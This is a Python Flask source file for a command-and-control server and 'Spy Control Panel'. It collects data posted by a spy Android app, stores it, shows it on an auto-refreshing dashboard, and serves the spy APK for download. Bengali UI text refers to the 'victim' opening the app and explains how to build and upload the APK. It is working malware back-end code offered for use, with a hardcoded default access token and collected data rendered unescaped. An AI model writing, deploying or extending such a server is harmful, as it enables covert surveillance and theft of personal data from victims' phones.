from flask import Flask, request, render_template_string, send_from_directory, jsonify
import os, json
from datetime import datetime

app = Flask(__name__)
DATA_FILE = "spy_data.json"
AUTH_TOKEN = os.environ.get("TOKEN", "survive123")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🕵️ Spy Control Panel</title>
    <style>
        * { box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: #0b0e1a; color: #eee; padding: 12px; }
        h1 { font-size: 24px; border-bottom: 2px solid #00d4ff; padding-bottom: 8px; }
        .btn {
            display: inline-block; background: #00d4ff; color: #000; 
            padding: 14px 24px; border-radius: 40px; font-weight: bold; 
            text-decoration: none; margin: 10px 0; width: 100%; text-align: center;
        }
        .btn-download { background: #ff5722; color: #fff; }
        .card {
            background: #1a1f2e; border-radius: 16px; padding: 14px 18px;
            margin: 14px 0; border-left: 6px solid #00d4ff;
        }
        .type { font-weight: bold; color: #00d4ff; }
        .time { font-size: 13px; color: #8899bb; }
        .data { margin-top: 8px; background: #0f131f; padding: 10px; border-radius: 10px; white-space: pre-wrap; word-break: break-word; }
        .empty { color: #667; text-align: center; padding: 40px 0; }
    </style>
</head>
<body>
    <h1>🕵️ Spy Control Panel</h1>
    <a href="/download" class="btn btn-download">📲 ডাউনলোড স্পাই অ্যাপ (APK)</a>
    <button class="btn" onclick="location.reload()">⟳ রিফ্রেশ ডেটা</button>
    <div id="data-container">
        {% if entries %}
            {% for entry in entries %}
            <div class="card">
                <div class="type">{{ entry.type.upper() }}</div>
                <div class="time">{{ entry.time }}</div>
                <div class="data">{{ entry.data | safe }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">কোনো ডেটা আসেনি। ভিকটিম অ্যাপ খোলার পর দেখো।</div>
        {% endif %}
    </div>
    <script>setTimeout(function(){ location.reload(); }, 15000);</script>
</body>
</html>
"""

@app.route('/')
def home():
    return "🕵️ C2 Server Active. Go to /view?token=survive123"

@app.route('/collect', methods=['POST'])
def collect():
    if request.headers.get('X-Token') != AUTH_TOKEN:
        return "Unauthorized", 401
    data = request.json
    data['time'] = str(datetime.now())
    with open(DATA_FILE, 'a') as f:
        f.write(json.dumps(data) + "\n")
    return "OK", 200

@app.route('/view')
def view():
    token = request.args.get('token')
    if token != AUTH_TOKEN:
        return "Unauthorized – token মেলেনি", 401
    entries = []
    try:
        with open(DATA_FILE, 'r') as f:
            for line in f:
                if line.strip():
                    entries.append(json.loads(line))
    except FileNotFoundError:
        entries = []
    entries.reverse()
    return render_template_string(HTML_TEMPLATE, entries=entries)

@app.route('/download')
def download_apk():
    try:
        return send_from_directory('static', 'spy.apk', as_attachment=True)
    except FileNotFoundError:
        return "APK ফাইল এখনও আপলোড করা হয়নি। প্রথমে গিটহাব অ্যাকশন থেকে APK বানিয়ে static ফোল্ডারে দাও।", 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)